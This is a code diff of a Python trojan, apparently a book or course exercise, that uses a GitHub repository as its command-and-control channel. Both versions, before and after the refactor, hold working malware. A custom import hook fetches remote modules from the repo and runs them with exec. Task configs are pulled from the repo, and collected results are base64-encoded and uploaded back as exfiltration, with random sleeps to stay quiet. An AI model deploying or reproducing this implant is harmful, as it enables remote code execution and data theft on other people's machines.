@@ -1,90 +1,115 @@
 import base64
 import github3
+import github3.repos
 import importlib.util
 import json
-import os
 import random
 import sys
 import threading
 import time
 from datetime import datetime
+from github3.repos.contents import Contents
 
-
-def github_connect():
-    """Kết nối đến GitHub repository."""
-    with open('chapter_7/bhptrojan/my_token.txt') as f:
+def github_connect(token_path='token.txt', owner='ybvy', repo='bhptrojan') -> github3.repos.Repository:
+    """Connects to the GitHub repository."""
+    with open(token_path) as f:
         token = f.read().strip()
-    
-    return github3.login(token=token).repository('ybvy', 'bhptrojan')
+    return github3.login(token=token).repository(owner, repo)
 
-
-def get_file_content(path: str, repo) -> bytes:
-    """Lấy nội dung file từ GitHub và giải mã base64."""
-    file = repo.file_contents(path)
-    return base64.b64decode(file.content)
-
-
-class Trojan:
-    def __init__(self, trojan_id: str):
-        self.id = trojan_id
-        self.config_file = f'config/{trojan_id}.json'
-        self.data_path = f'data/{trojan_id}/'
-        self.repo = github_connect()
-        os.makedirs(self.data_path, exist_ok=True)
-
-    def get_config(self):
-        """Tải cấu hình từ GitHub và import module nếu cần."""
-        config = json.loads(get_file_content(self.config_file, self.repo))
-        for task in config:
-            if task['module'] not in sys.modules:
-                __import__(task['module'])
-        return config
-
-    def module_runner(self, module):
-        """Chạy module và lưu kết quả."""
-        result = sys.modules[module].run()
-        self.store_module_result(result)
-
-    def store_module_result(self, data):
-        """Mã hóa và tải kết quả lên GitHub."""
-        message = datetime.now().isoformat()
-        path = f'data/{self.id}/{message}.data'
-        encoded_data = base64.b64encode(bytes(repr(data), 'utf-8'))  # Giữ nguyên kiểu bytes
-
-        try:
-            # Kiểm tra xem file đã tồn tại chưa
-            existing_file = self.repo.file_contents(path)
-            self.repo.update_file(path, message, encoded_data, existing_file.sha)
-        except github3.exceptions.NotFoundError:
-            # Nếu file chưa tồn tại, tạo mới
-            self.repo.create_file(path, message, encoded_data)
-
-
-    def run(self):
-        """Vòng lặp chính của Trojan."""
-        while True:
-            for task in self.get_config():
-                threading.Thread(target=self.module_runner, args=(task['module'],)).start()
-            time.sleep(random.randint(1800, 10800))  # 30 phút - 3 giờ
-
+def get_file_content(dir_name, module_name, repo: github3.repos.Repository) -> bytes:
+    """Fetch file content from GitHub repository."""
+    file: Contents = repo.file_contents(f"{dir_name}/{module_name}")
+    return file.decoded
 
 class GitImporter:
+    """Custom module loader to fetch and execute modules from GitHub."""
+    def __init__(self, repo):
+        self.current_module_code = ""
+        self.repo = repo
+
     def find_module(self, name, path=None):
-        """Tìm module trên GitHub."""
-        print(f"[*] Tải module: {name}")
-        self.repo = github_connect()
-        self.module_code = get_file_content(f'modules/{name}.py', self.repo)
-        return self if self.module_code else None
+        print(f"[*] Attempting to retrieve {name}")
+        try:
+            new_lib = get_file_content('modules', f'{name}.py', self.repo)
+            if new_lib:
+                self.current_module_code = new_lib.decode('utf-8')  
+                return self
+        except Exception as e:
+            print(f"[!] Error retrieving module {name}: {e}")
+        return None
 
     def load_module(self, name):
-        """Tạo module từ mã tải về."""
+        if name in sys.modules:
+            return sys.modules[name]
+
         spec = importlib.util.spec_from_loader(name, loader=None)
-        module = importlib.util.module_from_spec(spec)
-        exec(self.module_code, module.__dict__)
-        sys.modules[name] = module
-        return module
+        new_module = importlib.util.module_from_spec(spec)
 
+        try:
+            exec(self.current_module_code, new_module.__dict__)
+        except SyntaxError as e:
+            print(f"[!] Syntax error in module {name}: {e}")
+            return None 
 
-if __name__ == '__main__':
-    sys.meta_path.append(GitImporter())
-    Trojan('abc').run()
+        sys.modules[name] = new_module
+        return new_module
+
+class Trojan:
+    """Main Trojan class to manage module execution."""
+    def __init__(self, id, repo):
+        self.id = id
+        self.config_file = f'{id}.json'
+        self.data_path = f'data/{id}/'
+        self.repo = repo
+
+    def get_config(self):
+        """Fetches the configuration file and imports required modules."""
+        try:
+            config_json = get_file_content('config', self.config_file, self.repo)
+            config = json.loads(config_json)
+
+            for task in config:
+                if task['module'] not in sys.modules:
+                    __import__(task['module']) 
+
+            return config
+        except Exception as e:
+            print(f"[!] Error loading config: {e}")
+            return []
+
+    def module_runner(self, module):
+        """Runs a specified module and stores the result."""
+        try:
+            result = sys.modules[module].run()
+            self.store_module_result(result)
+        except Exception as e:
+            print(f"[!] Error running module {module}: {e}")
+
+    def store_module_result(self, data):
+        """Stores module execution results in the repository."""
+        try:
+            message = datetime.now().isoformat()
+            remote_path = f'data/{self.id}/{message}.data'
+            bindata = bytes('%r' % data, 'utf-8')
+            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+        except Exception as e:
+            print(f"[!] Error storing result: {e}")
+
+    def run(self):
+        """Continuously fetches config and runs tasks."""
+        while True:
+            config = self.get_config()
+            for task in config:
+                threading.Thread(
+                    target=self.module_runner,
+                    args=(task['module'],)
+                ).start()
+                time.sleep(random.randint(1, 10))
+
+            time.sleep(random.randint(30*60, 3*60*60))
+
+repo = github_connect()
+
+if __name__ == "__main__":
+    sys.meta_path.append(GitImporter(repo))
+    Trojan('abc', repo).run()
